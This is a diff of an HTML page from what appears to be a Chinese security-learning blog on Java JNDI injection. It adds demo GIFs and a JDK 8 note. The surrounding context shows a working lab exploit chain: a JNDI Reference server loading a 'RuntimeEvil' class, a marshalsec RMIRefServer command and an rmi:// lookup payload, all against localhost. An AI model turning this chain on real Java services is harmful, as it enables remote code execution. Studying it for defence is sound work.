@@ -703,6 +703,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIReferenceServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RuntimeEvil&quot;</span>, <span class="string">&quot;RuntimeEvil&quot;</span>, <span class="string">&quot;http://localhost:8888/&quot;</span>);</span><br><span class="line">        context.rebind(<span class="string">&quot;rmi://localhost:1099/remoteImpl&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>JNDIClient执行lookup就能弹计算器</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E8%87%AA%E5%86%99RMIServer%20JNDI%E6%B3%A8%E5%85%A5.gif" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E8%87%AA%E5%86%99RMIServer%20JNDI%E6%B3%A8%E5%85%A5.gif" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="自写RMIServer JNDI注入"></p>
 <blockquote>
 <p>新RuntimeEvil.class为什么Reference版的执行命令是写在构造函数，而RMI版命令执行代码是写在实现方法sayHello里面呢？</p>
 </blockquote>
@@ -733,7 +734,7 @@
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925165553736.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>So，RMI只是返回了创建好的实例。如果JNDI绑定的是Reference，则会传递RefrenceWrapper封装的类，在客户端上解封装并从factoryLocation加载类并实例化。</p>
 <p>如果不是Reference，当然不会在客户端实例化，也就不会调用构造函数</p>
-<p>上述JNDI+RMI可以用marshalsec来起</p>
+<p>上述JNDI+RMI可以用marshalsec来起，注意marshalsec需要保证本机为JDK8</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:<span class="comment">//127.0.0.1:8888/#RuntimeEvil 1099</span></span><br></pre></td></tr></table></figure>
 
 <p>默认RMI为1099</p>
@@ -741,8 +742,7 @@
 <p>lookup payload：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi:<span class="comment">//127.0.0.1:1099/#RuntimeEvil</span></span><br></pre></td></tr></table></figure>
 
-
-
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/marshalsec%20JNDI%E6%B3%A8%E5%85%A5.gif" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/marshalsec%20JNDI%E6%B3%A8%E5%85%A5.gif" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="marshalsec JNDI注入"></p>
 <h2 id="JNDI-other"><a href="#JNDI-other" class="headerlink" title="JNDI other"></a>JNDI other</h2><p>JNDI支持四种协议，如下表。</p>
 <table>
 <thead>
